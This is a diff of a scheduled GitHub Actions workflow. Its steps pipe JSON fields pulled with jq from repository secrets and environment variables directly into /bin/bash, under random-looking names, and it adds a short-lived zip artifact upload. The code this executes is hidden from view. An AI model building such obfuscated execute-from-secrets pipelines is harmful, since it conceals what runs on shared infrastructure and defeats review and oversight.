@@ -1,29 +1,25 @@
 name: yuanguoshengxing
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '1 0/6 * * *'
 
-jobs:  # 10930
+  schedule:
+    - cron: '7 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yuanguoshengxing
         env:
-          n80393: ${{ secrets.n80393 }}
+          x4380: ${{ secrets.x4380 }}
         run: |
-          echo $n80393 | jq -r .e21 | /bin/bash
-          echo $fy9641 | jq -r .avs6107 | /bin/bash
-          echo $ppen22009 | jq -r .n09 | /bin/bash
-          echo $sxbku8027 | jq -r .bzvb82931 | /bin/bash
-          echo $ygzfm6 | jq -r .ghwwl0203 | /bin/bash
-          echo $ukp725 | jq -r .nzjua1508 | /bin/bash
-          echo $g8702 | jq -r .awwfl424 | /bin/bash
-          echo $bl7500 | jq -r .z7033 | /bin/bash
-          echo $isi504 | jq -r .at16 | /bin/bash
-          echo $ns27957 | jq -r .tld9770 | /bin/bash
-          echo $m54199 | jq -r .jrcdm872 | /bin/bash
-          echo $phk637 | jq -r .vyy40905 | /bin/bash
+          printf '%s' "$x4380" | jq -r .a7 | /bin/bash
+          printf '%s' "$m0211" | jq -r .drpm7 | /bin/bash
+          printf '%s' "$kqiub96" | jq -r .akpje20902 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4yfGRoIq
+          path: "*.zip"
+          retention-days: 1
